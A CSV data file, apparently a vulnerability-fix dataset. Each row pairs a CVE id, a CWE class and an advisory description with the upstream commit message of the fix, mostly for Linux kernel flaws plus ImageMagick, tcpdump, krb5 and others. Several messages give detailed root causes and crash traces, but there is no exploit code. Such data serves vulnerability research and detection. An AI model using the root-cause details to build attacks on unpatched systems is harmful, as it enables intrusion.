CVE-2017-16939,CWE-416,2017-11-24,The XFRM dump policy implementation in net/xfrm/xfrm_user.c in the Linux kernel before 4.13.11 allows local users to gain privileges or cause a denial of service (use-after-free) via a crafted SO_RCVBUF setsockopt system call in conjunction with XFRM_MSG_GETPOLICY Netlink messages.,"An independent security researcher, Mohamed Ghannam, has reported this vulnerability to Beyond Security's SecuriTeam Secure Disclosure program.  The xfrm_dump_policy_done function expects xfrm_dump_policy to have been called at least once or it will crash.  This can be triggered if a dump fails because the target socket's receive buffer is full.  This patch fixes it by using the cb->start mechanism to ensure that the initialisation is always done regardless of the buffer situation.  Fixes: 12a169e (""ipsec: Put dumpers on the dump list"") Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: Steffen Klassert <steffen.klassert@secunet.com>"
CVE-2017-13043,CWE-125,2017-09-14,The BGP parser in tcpdump before 4.9.2 has a buffer over-read in print-bgp.c:decode_multicast_vpn().,"RFC 6514 Section 4.6 defines the structure for Shared Tree Join (6) and Source Tree Join (7) multicast VPN route types. decode_multicast_vpn() didn't implement the Source AS field of that structure properly, adjust the offsets to put it right.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2017-8067,CWE-787,2017-04-23,"drivers/char/virtio_console.c in the Linux kernel 4.9.x and 4.10.x before 4.10.12 interacts incorrectly with the CONFIG_VMAP_STACK option, which allows local users to cause a denial of service (system crash or memory corruption) or possibly have unspecified other impact by leveraging use of more than one virtual page for a DMA scatterlist.",
CVE-2015-8569,CWE-200,2015-12-28,"The (1) pptp_bind and (2) pptp_connect functions in drivers/net/ppp/pptp.c in the Linux kernel through 4.3.3 do not verify an address length, which allows local users to obtain sensitive information from kernel memory and bypass the KASLR protection mechanism via a crafted application.",Reported-by: Dmitry Vyukov <dvyukov@gmail.com> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2015-0274,CWE-19,2015-03-16,"The XFS implementation in the Linux kernel before 3.15 improperly uses an old size value during remote attribute replacement, which allows local users to cause a denial of service (transaction overrun and data corruption) or possibly gain privileges by leveraging XFS filesystem access.","Commit e461fcb (""xfs: remote attribute lookups require the value length"") passes the remote attribute length in the xfs_da_args structure on lookup so that CRC calculations and validity checking can be performed correctly by related code. This, unfortunately has the side effect of changing the args->valuelen parameter in cases where it shouldn't.  That is, when we replace a remote attribute, the incoming replacement stores the value and length in args->value and args->valuelen, but then the lookup which finds the existing remote attribute overwrites args->valuelen with the length of the remote attribute being replaced. Hence when we go to create the new attribute, we create it of the size of the existing remote attribute, not the size it is supposed to be. When the new attribute is much smaller than the old attribute, this results in a transaction overrun and an ASSERT() failure on a debug kernel:  XFS: Assertion failed: tp->t_blk_res_used <= tp->t_blk_res, file: fs/xfs/xfs_trans.c, line: 331  Fix this by keeping the remote attribute value length separate to the attribute value length in the xfs_da_args structure. The enables us to pass the length of the remote attribute to be removed without overwriting the new attribute's length.  Also, ensure that when we save remote block contexts for a later rename we zero the original state variables so that we don't confuse the state of the attribute to be removes with the state of the new attribute that we just added. [Spotted by Brain Foster.]  Signed-off-by: Dave Chinner <dchinner@redhat.com> Reviewed-by: Brian Foster <bfoster@redhat.com> Signed-off-by: Dave Chinner <david@fromorbit.com>"
CVE-2017-6502,CWE-119,2017-03-06,"An issue was discovered in ImageMagick 6.9.7. A specially crafted webp file could lead to a file-descriptor leak in libmagickcore (thus, a DoS).",
CVE-2018-14734,CWE-416,2018-07-29,"drivers/infiniband/core/ucma.c in the Linux kernel through 4.17.11 allows ucma_leave_multicast to access a certain data structure after a cleanup step in ucma_process_join, which allows attackers to cause a denial of service (use-after-free).","ucma_process_join() will free the new allocated ""mc"" struct, if there is any error after that, especially the copy_to_user().  But in parallel, ucma_leave_multicast() could find this ""mc"" through idr_find() before ucma_process_join() frees it, since it is already published.  So ""mc"" could be used in ucma_leave_multicast() after it is been allocated and freed in ucma_process_join(), since we don't refcnt it.  Fix this by separating ""publish"" from ID allocation, so that we can get an ID first and publish it later after copy_to_user().  Fixes: c8f6a36 (""RDMA/cma: Add multicast communication support"") Reported-by: Noam Rathaus <noamr@beyondsecurity.com> Signed-off-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: Jason Gunthorpe <jgg@mellanox.com>"
CVE-2016-7914,CWE-125,2016-11-16,"The assoc_array_insert_into_terminal_node function in lib/assoc_array.c in the Linux kernel before 4.5.3 does not check whether a slot is a leaf, which allows local users to obtain sensitive information from kernel memory or cause a denial of service (invalid pointer dereference and out-of-bounds read) via an application that uses associative-array data structures, as demonstrated by the keyutils test suite.","Changes since V1: fixed the description and added KASan warning.  In assoc_array_insert_into_terminal_node(), we call the compare_object() method on all non-empty slots, even when they're not leaves, passing a pointer to an unexpected structure to compare_object(). Currently it causes an out-of-bound read access in keyring_compare_object detected by KASan (see below). The issue is easily reproduced with keyutils testsuite. Only call compare_object() when the slot is a leave.  KASan warning: ================================================================== BUG: KASAN: slab-out-of-bounds in keyring_compare_object+0x213/0x240 at addr ffff880060a6f838 Read of size 8 by task keyctl/1655 ============================================================================= BUG kmalloc-192 (Not tainted): kasan: bad access detected -----------------------------------------------------------------------------  Disabling lock debugging due to kernel taint INFO: Allocated in assoc_array_insert+0xfd0/0x3a60 age=69 cpu=1 pid=1647 	___slab_alloc+0x563/0x5c0 	__slab_alloc+0x51/0x90 	kmem_cache_alloc_trace+0x263/0x300 	assoc_array_insert+0xfd0/0x3a60 	__key_link_begin+0xfc/0x270 	key_create_or_update+0x459/0xaf0 	SyS_add_key+0x1ba/0x350 	entry_SYSCALL_64_fastpath+0x12/0x76 INFO: Slab 0xffffea0001829b80 objects=16 used=8 fp=0xffff880060a6f550 flags=0x3fff8000004080 INFO: Object 0xffff880060a6f740 @offset=5952 fp=0xffff880060a6e5d1  Bytes b4 ffff880060a6f730: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f740: d1 e5 a6 60 00 88 ff ff 0e 00 00 00 00 00 00 00  ...`............ Object ffff880060a6f750: 02 cf 8e 60 00 88 ff ff 02 c0 8e 60 00 88 ff ff  ...`.......`.... Object ffff880060a6f760: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f770: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f790: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7d0: 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ Object ffff880060a6f7f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................ CPU: 0 PID: 1655 Comm: keyctl Tainted: G    B           4.5.0-rc4-kasan+ #291 Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011  0000000000000000 000000001b2800b4 ffff880060a179e0 ffffffff81b60491  ffff88006c802900 ffff880060a6f740 ffff880060a17a10 ffffffff815e2969  ffff88006c802900 ffffea0001829b80 ffff880060a6f740 ffff880060a6e650 Call Trace:  [<ffffffff81b60491>] dump_stack+0x85/0xc4  [<ffffffff815e2969>] print_trailer+0xf9/0x150  [<ffffffff815e9454>] object_err+0x34/0x40  [<ffffffff815ebe50>] kasan_report_error+0x230/0x550  [<ffffffff819949be>] ? keyring_get_key_chunk+0x13e/0x210  [<ffffffff815ec62d>] __asan_report_load_n_noabort+0x5d/0x70  [<ffffffff81994cc3>] ? keyring_compare_object+0x213/0x240  [<ffffffff81994cc3>] keyring_compare_object+0x213/0x240  [<ffffffff81bc238c>] assoc_array_insert+0x86c/0x3a60  [<ffffffff81bc1b20>] ? assoc_array_cancel_edit+0x70/0x70  [<ffffffff8199797d>] ? __key_link_begin+0x20d/0x270  [<ffffffff8199786c>] __key_link_begin+0xfc/0x270  [<ffffffff81993389>] key_create_or_update+0x459/0xaf0  [<ffffffff8128ce0d>] ? trace_hardirqs_on+0xd/0x10  [<ffffffff81992f30>] ? key_type_lookup+0xc0/0xc0  [<ffffffff8199e19d>] ? lookup_user_key+0x13d/0xcd0  [<ffffffff81534763>] ? memdup_user+0x53/0x80  [<ffffffff819983ea>] SyS_add_key+0x1ba/0x350  [<ffffffff81998230>] ? key_get_type_from_user.constprop.6+0xa0/0xa0  [<ffffffff828bcf4e>] ? retint_user+0x18/0x23  [<ffffffff8128cc7e>] ? trace_hardirqs_on_caller+0x3fe/0x580  [<ffffffff81004017>] ? trace_hardirqs_on_thunk+0x17/0x19  [<ffffffff828bc432>] entry_SYSCALL_64_fastpath+0x12/0x76 Memory state around the buggy address:  ffff880060a6f700: fc fc fc fc fc fc fc fc 00 00 00 00 00 00 00 00  ffff880060a6f780: 00 00 00 00 00 00 00 00 00 00 00 fc fc fc fc fc >ffff880060a6f800: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc                                         ^  ffff880060a6f880: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc  ffff880060a6f900: fc fc fc fc fc fc 00 00 00 00 00 00 00 00 00 00 ==================================================================  Signed-off-by: Jerome Marchand <jmarchan@redhat.com> Signed-off-by: David Howells <dhowells@redhat.com> cc: stable@vger.kernel.org"
CVE-2016-10068,CWE-20,2017-03-02,The MSL interpreter in ImageMagick before 6.9.6-4 allows remote attackers to cause a denial of service (segmentation fault and application crash) via a crafted XML file.,
CVE-2018-10717,CWE-787,2018-05-03,"The DecodeGifImg function in ngiflib.c in MiniUPnP ngiflib 0.4 does not consider the bounds of the pixels data structure, which allows remote attackers to cause a denial of service (WritePixels heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted GIF file, a different vulnerability than CVE-2018-10677.",fixes #3
CVE-2015-8964,CWE-200,2016-11-16,The tty_set_termios_ldisc function in drivers/tty/tty_ldisc.c in the Linux kernel before 4.5 allows local users to obtain sensitive information from kernel memory by reading a tty data structure.,"Line discipline drivers may mistakenly misuse ldisc-related fields when initializing. For example, a failure to initialize tty->receive_room in the N_GIGASET_M101 line discipline was recently found and fixed [1]. Now, the N_X25 line discipline has been discovered accessing the previous line discipline's already-freed private data [2].  Harden the ldisc interface against misuse by initializing revelant tty fields before instancing the new line discipline.  [1]     commit fd98e94     Author: Tilman Schmidt <tilman@imap.cc>     Date:   Tue Jul 14 00:37:13 2015 +0200      isdn/gigaset: reset tty->receive_room when attaching ser_gigaset  [2] Report from Sasha Levin <sasha.levin@oracle.com>     [  634.336761] ==================================================================     [  634.338226] BUG: KASAN: use-after-free in x25_asy_open_tty+0x13d/0x490 at addr ffff8800a743efd0     [  634.339558] Read of size 4 by task syzkaller_execu/8981     [  634.340359] =============================================================================     [  634.341598] BUG kmalloc-512 (Not tainted): kasan: bad access detected     ...     [  634.405018] Call Trace:     [  634.405277] dump_stack (lib/dump_stack.c:52)     [  634.405775] print_trailer (mm/slub.c:655)     [  634.406361] object_err (mm/slub.c:662)     [  634.406824] kasan_report_error (mm/kasan/report.c:138 mm/kasan/report.c:236)     [  634.409581] __asan_report_load4_noabort (mm/kasan/report.c:279)     [  634.411355] x25_asy_open_tty (drivers/net/wan/x25_asy.c:559 (discriminator 1))     [  634.413997] tty_ldisc_open.isra.2 (drivers/tty/tty_ldisc.c:447)     [  634.414549] tty_set_ldisc (drivers/tty/tty_ldisc.c:567)     [  634.415057] tty_ioctl (drivers/tty/tty_io.c:2646 drivers/tty/tty_io.c:2879)     [  634.423524] do_vfs_ioctl (fs/ioctl.c:43 fs/ioctl.c:607)     [  634.427491] SyS_ioctl (fs/ioctl.c:622 fs/ioctl.c:613)     [  634.427945] entry_SYSCALL_64_fastpath (arch/x86/entry/entry_64.S:188)  Cc: Tilman Schmidt <tilman@imap.cc> Cc: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: Peter Hurley <peter@hurleysoftware.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2016-9794,CWE-362,2016-12-28,Race condition in the snd_pcm_period_elapsed function in sound/core/pcm_lib.c in the ALSA subsystem in the Linux kernel before 4.7 allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via a crafted SNDRV_PCM_TRIGGER_START command.,"Currently kill_fasync() is called outside the stream lock in snd_pcm_period_elapsed().  This is potentially racy, since the stream may get released even during the irq handler is running.  Although snd_pcm_release_substream() calls snd_pcm_drop(), this doesn't guarantee that the irq handler finishes, thus the kill_fasync() call outside the stream spin lock may be invoked after the substream is detached, as recently reported by KASAN.  As a quick workaround, move kill_fasync() call inside the stream lock.  The fasync is rarely used interface, so this shouldn't have a big impact from the performance POV.  Ideally, we should implement some sync mechanism for the proper finish of stream and irq handler.  But this oneliner should suffice for most cases, so far.  Reported-by: Baozeng Ding <sploving1@gmail.com> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2014-5352,,2015-02-19,"The krb5_gss_process_context_token function in lib/gssapi/krb5/process_context_token.c in the libgssapi_krb5 library in MIT Kerberos 5 (aka krb5) through 1.11.5, 1.12.x through 1.12.2, and 1.13.x before 1.13.1 does not properly maintain security-context handles, which allows remote authenticated users to cause a denial of service (use-after-free and double free, and daemon crash) or possibly execute arbitrary code via crafted GSSAPI traffic, as demonstrated by traffic to kadmind.","[MITKRB5-SA-2015-001] The krb5 gss_process_context_token() should not actually delete the context; that leaves the caller with a dangling pointer and no way to know that it is invalid.  Instead, mark the context as terminated, and check for terminated contexts in the GSS functions which expect established contexts.  Also add checks in export_sec_context and pseudo_random, and adjust t_prf.c for the pseudo_random check.  ticket: 8055 (new) target_version: 1.13.1 tags: pullup"
CVE-2013-2140,CWE-20,2013-09-25,The dispatch_discard_io function in drivers/block/xen-blkback/blkback.c in the Xen blkback implementation in the Linux kernel before 3.10.5 allows guest OS users to cause a denial of service (data loss) via filesystem write operations on a read-only disk that supports the (1) BLKIF_OP_DISCARD (aka discard or TRIM) or (2) SCSI UNMAP feature.,We need to make sure that the device is not RO or that the request is not past the number of sectors we want to issue the DISCARD operation for.  This fixes CVE-2013-2140.  Cc: stable@vger.kernel.org Acked-by: Jan Beulich <JBeulich@suse.com> Acked-by: Ian Campbell <Ian.Campbell@citrix.com> [v1: Made it pr_warn instead of pr_debug] Signed-off-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>
CVE-2016-4579,CWE-20,2016-06-13,"Libksba before 1.3.4 allows remote attackers to cause a denial of service (out-of-bounds read and crash) via unspecified vectors, related to the ""returned length of the object from _ksba_ber_parse_tl.""",
CVE-2017-15994,CWE-354,2017-10-29,"rsync 3.1.3-development before 2017-10-24 mishandles archaic checksums, which makes it easier for remote attackers to bypass intended access restrictions. NOTE: the rsync development branch has significant use beyond the rsync developers, e.g., the code has been copied for use in various GitHub projects.",
CVE-2017-9727,CWE-125,2017-07-26,The gx_ttfReader__Read function in base/gxttfb.c in Artifex Ghostscript GhostXPS 9.21 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) or possibly have unspecified other impact via a crafted document.,
CVE-2017-1000211,CWE-416,2017-11-17,"Lynx before 2.8.9dev.16 is vulnerable to a use after free in the HTML parser resulting in memory disclosure, because HTML_put_string() can append a chunk onto itself.",
CVE-2015-1421,,2015-03-16,Use-after-free vulnerability in the sctp_assoc_update function in net/sctp/associola.c in the Linux kernel before 3.18.8 allows remote attackers to cause a denial of service (slab corruption and panic) or possibly have unspecified other impact by triggering an INIT collision that leads to improper handling of shared-key data.,"When hitting an INIT collision case during the 4WHS with AUTH enabled, as already described in detail in commit 1be9a95 (""net: sctp: inherit auth_capable on INIT collisions""), it can happen that we occasionally still remotely trigger the following panic on server side which seems to have been uncovered after the fix from commit 1be9a95 ...  [  533.876389] BUG: unable to handle kernel paging request at 00000000ffffffff [  533.913657] IP: [<ffffffff811ac385>] __kmalloc+0x95/0x230 [  533.940559] PGD 5030f2067 PUD 0 [  533.957104] Oops: 0000 [#1] SMP [  533.974283] Modules linked in: sctp mlx4_en [...] [  534.939704] Call Trace: [  534.951833]  [<ffffffff81294e30>] ? crypto_init_shash_ops+0x60/0xf0 [  534.984213]  [<ffffffff81294e30>] crypto_init_shash_ops+0x60/0xf0 [  535.015025]  [<ffffffff8128c8ed>] __crypto_alloc_tfm+0x6d/0x170 [  535.045661]  [<ffffffff8128d12c>] crypto_alloc_base+0x4c/0xb0 [  535.074593]  [<ffffffff8160bd42>] ? _raw_spin_lock_bh+0x12/0x50 [  535.105239]  [<ffffffffa0418c11>] sctp_inet_listen+0x161/0x1e0 [sctp] [  535.138606]  [<ffffffff814e43bd>] SyS_listen+0x9d/0xb0 [  535.166848]  [<ffffffff816149a9>] system_call_fastpath+0x16/0x1b  ... or depending on the the application, for example this one:  [ 1370.026490] BUG: unable to handle kernel paging request at 00000000ffffffff [ 1370.026506] IP: [<ffffffff811ab455>] kmem_cache_alloc+0x75/0x1d0 [ 1370.054568] PGD 633c94067 PUD 0 [ 1370.070446] Oops: 0000 [#1] SMP [ 1370.085010] Modules linked in: sctp kvm_amd kvm [...] [ 1370.963431] Call Trace: [ 1370.974632]  [<ffffffff8120f7cf>] ? SyS_epoll_ctl+0x53f/0x960 [ 1371.000863]  [<ffffffff8120f7cf>] SyS_epoll_ctl+0x53f/0x960 [ 1371.027154]  [<ffffffff812100d3>] ? anon_inode_getfile+0xd3/0x170 [ 1371.054679]  [<ffffffff811e3d67>] ? __alloc_fd+0xa7/0x130 [ 1371.080183]  [<ffffffff816149a9>] system_call_fastpath+0x16/0x1b  With slab debugging enabled, we can see that the poison has been overwritten:  [  669.826368] BUG kmalloc-128 (Tainted: G        W     ): Poison overwritten [  669.826385] INFO: 0xffff880228b32e50-0xffff880228b32e50. First byte 0x6a instead of 0x6b [  669.826414] INFO: Allocated in sctp_auth_create_key+0x23/0x50 [sctp] age=3 cpu=0 pid=18494 [  669.826424]  __slab_alloc+0x4bf/0x566 [  669.826433]  __kmalloc+0x280/0x310 [  669.826453]  sctp_auth_create_key+0x23/0x50 [sctp] [  669.826471]  sctp_auth_asoc_create_secret+0xcb/0x1e0 [sctp] [  669.826488]  sctp_auth_asoc_init_active_key+0x68/0xa0 [sctp] [  669.826505]  sctp_do_sm+0x29d/0x17c0 [sctp] [...] [  669.826629] INFO: Freed in kzfree+0x31/0x40 age=1 cpu=0 pid=18494 [  669.826635]  __slab_free+0x39/0x2a8 [  669.826643]  kfree+0x1d6/0x230 [  669.826650]  kzfree+0x31/0x40 [  669.826666]  sctp_auth_key_put+0x19/0x20 [sctp] [  669.826681]  sctp_assoc_update+0x1ee/0x2d0 [sctp] [  669.826695]  sctp_do_sm+0x674/0x17c0 [sctp]  Since this only triggers in some collision-cases with AUTH, the problem at heart is that sctp_auth_key_put() on asoc->asoc_shared_key is called twice when having refcnt 1, once directly in sctp_assoc_update() and yet again from within sctp_auth_asoc_init_active_key() via sctp_assoc_update() on the already kzfree'd memory, which is also consistent with the observation of the poison decrease from 0x6b to 0x6a (note: the overwrite is detected at a later point in time when poison is checked on new allocation).  Reference counting of auth keys revisited:  Shared keys for AUTH chunks are being stored in endpoints and associations in endpoint_shared_keys list. On endpoint creation, a null key is being added; on association creation, all endpoint shared keys are being cached and thus cloned over to the association. struct sctp_shared_key only holds a pointer to the actual key bytes, that is, struct sctp_auth_bytes which keeps track of users internally through refcounting. Naturally, on assoc or enpoint destruction, sctp_shared_key are being destroyed directly and the reference on sctp_auth_bytes dropped.  User space can add keys to either list via setsockopt(2) through struct sctp_authkey and by passing that to sctp_auth_set_key() which replaces or adds a new auth key. There, sctp_auth_create_key() creates a new sctp_auth_bytes with refcount 1 and in case of replacement drops the reference on the old sctp_auth_bytes. A key can be set active from user space through setsockopt() on the id via sctp_auth_set_active_key(), which iterates through either endpoint_shared_keys and in case of an assoc, invokes (one of various places) sctp_auth_asoc_init_active_key().  sctp_auth_asoc_init_active_key() computes the actual secret from local's and peer's random, hmac and shared key parameters and returns a new key directly as sctp_auth_bytes, that is asoc->asoc_shared_key, plus drops the reference if there was a previous one. The secret, which where we eventually double drop the ref comes from sctp_auth_asoc_set_secret() with intitial refcount of 1, which also stays unchanged eventually in sctp_assoc_update(). This key is later being used for crypto layer to set the key for the hash in crypto_hash_setkey() from sctp_auth_calculate_hmac().  To close the loop: asoc->asoc_shared_key is freshly allocated secret material and independant of the sctp_shared_key management keeping track of only shared keys in endpoints and assocs. Hence, also commit 4184b2a (""net: sctp: fix memory leak in auth key management"") is independant of this bug here since it concerns a different layer (though same structures being used eventually). asoc->asoc_shared_key is reference dropped correctly on assoc destruction in sctp_association_free() and when active keys are being replaced in sctp_auth_asoc_init_active_key(), it always has a refcount of 1. Hence, it's freed prematurely in sctp_assoc_update(). Simple fix is to remove that sctp_auth_key_put() from there which fixes these panics.  Fixes: 730fc3d (""[SCTP]: Implete SCTP-AUTH parameter processing"") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-17407,CWE-119,2018-09-23,"An issue was discovered in t1_check_unusual_charstring functions in writet1.c files in TeX Live before 2018-09-21. A buffer overflow in the handling of Type 1 fonts allows arbitrary code execution when a malicious font is loaded by one of the vulnerable tools: pdflatex, pdftex, dvips, or luatex.",git-svn-id: svn://tug.org/texlive/trunk/Build/source@48697 c570f23f-e606-0410-a88d-b1316a301751
CVE-2013-3225,CWE-200,2013-04-22,"The rfcomm_sock_recvmsg function in net/bluetooth/rfcomm/sock.c in the Linux kernel before 3.9-rc7 does not initialize a certain length variable, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call.","If RFCOMM_DEFER_SETUP is set in the flags, rfcomm_sock_recvmsg() returns early with 0 without updating the possibly set msg_namelen member. This, in turn, leads to a 128 byte kernel stack leak in net/socket.c.  Fix this by updating msg_namelen in this case. For all other cases it will be handled in bt_sock_stream_recvmsg().  Cc: Marcel Holtmann <marcel@holtmann.org> Cc: Gustavo Padovan <gustavo@padovan.org> Cc: Johan Hedberg <johan.hedberg@gmail.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-9841,CWE-189,2017-05-23,inffast.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact by leveraging improper pointer arithmetic.,
CVE-2016-7530,CWE-369,2017-04-20,The quantum handling code in ImageMagick allows remote attackers to cause a denial of service (divide-by-zero error or out-of-bounds write) via a crafted file.,
CVE-2017-18200,CWE-20,2018-02-26,"The f2fs implementation in the Linux kernel before 4.14 mishandles reference counts associated with f2fs_wait_discard_bios calls, which allows local users to cause a denial of service (BUG), as demonstrated by fstrim.","As Ju Hyung Park reported:  ""When 'fstrim' is called for manual trim, a BUG() can be triggered randomly with this patch.  I'm seeing this issue on both x86 Desktop and arm64 Android phone.  On x86 Desktop, this was caused during Ubuntu boot-up. I have a cronjob installed which calls 'fstrim -v /' during boot. On arm64 Android, this was caused during GC looping with 1ms gc_min_sleep_time & gc_max_sleep_time.""  Root cause of this issue is that f2fs_wait_discard_bios can only be used by f2fs_put_super, because during put_super there must be no other referrers, so it can ignore discard entry's reference count when removing the entry, otherwise in other caller we will hit bug_on in __remove_discard_cmd as there may be other issuer added reference count in discard entry.  Thread A				Thread B 					- issue_discard_thread - f2fs_ioc_fitrim  - f2fs_trim_fs   - f2fs_wait_discard_bios    - __issue_discard_cmd     - __submit_discard_cmd 					 - __wait_discard_cmd 					  - dc->ref++ 					  - __wait_one_discard_bio    - __wait_discard_cmd     - __remove_discard_cmd      - f2fs_bug_on(sbi, dc->ref)  Fixes: 969d1b1 Reported-by: Ju Hyung Park <qkrwngud825@gmail.com> Signed-off-by: Chao Yu <yuchao0@huawei.com> Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>"
CVE-2015-5707,CWE-190,2015-10-19,Integer overflow in the sg_start_req function in drivers/scsi/sg.c in the Linux kernel 2.6.x through 4.x before 4.1 allows local users to cause a denial of service or possibly have unspecified other impact via a large iov_count value in a write request.,"unfortunately, allowing an arbitrary 16bit value means a possibility of overflow in the calculation of total number of pages in bio_map_user_iov() - we rely on there being no more than PAGE_SIZE members of sum in the first loop there.  If that sum wraps around, we end up allocating too small array of pointers to pages and it's easy to overflow it in the second loop.  X-Coverup: TINC (and there's no lumber cartel either) Cc: stable@vger.kernel.org # way, way back Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2014-0205,CWE-119,2014-09-28,"The futex_wait function in kernel/futex.c in the Linux kernel before 2.6.37 does not properly maintain a certain reference count during requeue operations, which allows local users to cause a denial of service (use-after-free and system crash) or possibly gain privileges via a crafted application that triggers a zero count.","futex_wait() is leaking key references due to futex_wait_setup() acquiring an additional reference via the queue_lock() routine. The nested key ref-counting has been masking bugs and complicating code analysis. queue_lock() is only called with a previously ref-counted key, so remove the additional ref-counting from the queue_(un)lock() functions.  Also futex_wait_requeue_pi() drops one key reference too many in unqueue_me_pi(). Remove the key reference handling from unqueue_me_pi(). This was paired with a queue_lock() in futex_lock_pi(), so the count remains unchanged.  Document remaining nested key ref-counting sites.  Signed-off-by: Darren Hart <dvhart@linux.intel.com> Reported-and-tested-by: Matthieu Fertré<matthieu.fertre@kerlabs.com> Reported-by: Louis Rilling<louis.rilling@kerlabs.com> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Eric Dumazet <eric.dumazet@gmail.com> Cc: John Kacur <jkacur@redhat.com> Cc: Rusty Russell <rusty@rustcorp.com.au> LKML-Reference: <4CBB17A8.70401@linux.intel.com> Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Cc: stable@kernel.org"
CVE-2017-18379,CWE-119,2019-07-27,"In the Linux kernel before 4.14, an out of boundary access happened in drivers/nvme/target/fc.c.",When searching for queue id's ensure they are within the expected range.  Signed-off-by: James Smart <james.smart@broadcom.com> Signed-off-by: Christoph Hellwig <hch@lst.de> Signed-off-by: Jens Axboe <axboe@kernel.dk>
CVE-2013-7449,CWE-310,2016-04-21,"The ssl_do_connect function in common/server.c in HexChat before 2.10.2, XChat, and XChat-GNOME does not verify that the server hostname matches a domain name in the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.",Closes #524
CVE-2017-8925,CWE-404,2017-05-12,The omninet_open function in drivers/usb/serial/omninet.c in the Linux kernel before 4.10.4 allows local users to cause a denial of service (tty exhaustion) by leveraging reference count mishandling.,"This driver needlessly took another reference to the tty on open, a reference which was then never released on close. This lead to not just a leak of the tty, but also a driver reference leak that prevented the driver from being unloaded after a port had once been opened.  Fixes: 4a90f09 (""tty: usb-serial krefs"") Cc: stable <stable@vger.kernel.org>	# 2.6.28 Signed-off-by: Johan Hovold <johan@kernel.org>"
CVE-2017-2671,,2017-04-05,"The ping_unhash function in net/ipv4/ping.c in the Linux kernel through 4.10.8 is too late in obtaining a certain lock and consequently cannot ensure that disconnect function calls are safe, which allows local users to cause a denial of service (panic) by leveraging access to the protocol value of IPPROTO_ICMP in a socket system call.","We got a report of yet another bug in ping  http://www.openwall.com/lists/oss-security/2017/03/24/6  ->disconnect() is not called with socket lock held.  Fix this by acquiring ping rwlock earlier.  Thanks to Daniel, Alexander and Andrey for letting us know this problem.  Fixes: c319b4d (""net: ipv4: add IPPROTO_ICMP socket kind"") Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Daniel Jiang <danieljiang0415@gmail.com> Reported-by: Solar Designer <solar@openwall.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2013-2634,CWE-399,2013-03-22,"net/dcb/dcbnl.c in the Linux kernel before 3.8.4 does not initialize certain structures, which allows local users to obtain sensitive information from kernel stack memory via a crafted application.","The dcb netlink interface leaks stack memory in various places: * perm_addr[] buffer is only filled at max with 12 of the 32 bytes but   copied completely, * no in-kernel driver fills all fields of an IEEE 802.1Qaz subcommand,   so we're leaking up to 58 bytes for ieee_ets structs, up to 136 bytes   for ieee_pfc structs, etc., * the same is true for CEE -- no in-kernel driver fills the whole   struct,  Prevent all of the above stack info leaks by properly initializing the buffers/structures involved.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-15858,CWE-476,2018-08-25,Unchecked NULL pointer usage when handling invalid aliases in CopyKeyAliasesToKeymap in xkbcomp/keycodes.c in xkbcommon before 0.8.1 could be used by local attackers to crash (NULL pointer dereference) the xkbcommon parser by supplying a crafted keymap file.,"Move the aliases copy to within the (num_key_aliases > 0) block.  Passing info->aliases into this fuction with invalid aliases will cause log messages but num_key_aliases stays on 0. The key_aliases array is never allocated and remains NULL. We then loop through the aliases, causing a null-pointer dereference.  Signed-off-by: Peter Hutterer <peter.hutterer@who-t.net>"
